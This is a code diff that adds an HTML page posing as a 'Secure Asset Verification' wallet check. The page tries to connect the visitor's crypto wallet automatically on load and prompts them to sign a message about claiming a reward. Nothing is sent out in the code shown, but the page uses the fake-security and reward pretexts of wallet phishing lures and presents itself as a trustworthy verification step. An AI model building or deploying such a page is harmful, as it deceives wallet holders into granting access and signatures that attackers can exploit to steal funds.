@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Asset Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      text-align: center;
+      padding: 40px;
+    }
+    button {
+      padding: 12px 20px;
+      margin: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    #connect { background: #22c55e; }
+    #sign { background: #3b82f6; }
+    #log {
+      margin-top: 20px;
+      text-align: left;
+      background: #020617;
+      padding: 15px;
+      border-radius: 8px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      font-size: 13px;
+      height: 200px;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body>
+
+<h2>🔐 Verifying Wallet Security...</h2>
+<p>Please wait while we verify your wallet.</p>
+
+<button id="connect" onclick="connectWallet()">Connect Wallet</button>
+<button id="sign" onclick="signMessage()">Sign Verification</button>
+
+<div id="log"></div>
+
+<script>
+  const logBox = document.getElementById("log");
+
+  function log(msg) {
+    const p = document.createElement("div");
+    p.innerText = "> " + msg;
+    logBox.appendChild(p);
+    logBox.scrollTop = logBox.scrollHeight;
+    console.log(msg);
+  }
+
+  async function autoConnect() {
+    if (!window.ethereum) {
+      log("No wallet provider found.");
+      return;
+    }
+
+    log("Attempting automatic wallet connection...");
+
+    try {
+      const accounts = await window.ethereum.request({
+        method: 'eth_requestAccounts'
+      });
+
+      log("Connected: " + accounts[0]);
+    } catch (err) {
+      log("Auto-connect blocked or rejected.");
+    }
+  }
+
+  async function connectWallet() {
+    if (!window.ethereum) {
+      alert("No wallet detected");
+      return;
+    }
+
+    try {
+      const accounts = await window.ethereum.request({
+        method: 'eth_requestAccounts'
+      });
+      log("Manual connect success: " + accounts[0]);
+    } catch (err) {
+      log("Manual connect failed.");
+    }
+  }
+
+  async function signMessage() {
+    if (!window.ethereum) {
+      alert("No wallet detected");
+      return;
+    }
+
+    try {
+      const accounts = await window.ethereum.request({
+        method: 'eth_requestAccounts'
+      });
+
+      const msg = "Security verification required to claim reward.";
+      log("Requesting signature...");
+
+      const signature = await window.ethereum.request({
+        method: 'personal_sign',
+        params: [msg, accounts[0]]
+      });
+
+      log("Signature received.");
+    } catch (err) {
+      log("Signature request failed or rejected.");
+    }
+  }
+
+  // Auto-trigger on load
+  window.addEventListener("load", () => {
+    setTimeout(autoConnect, 1000);
+  });
+</script>
+
+</body>
+</html>
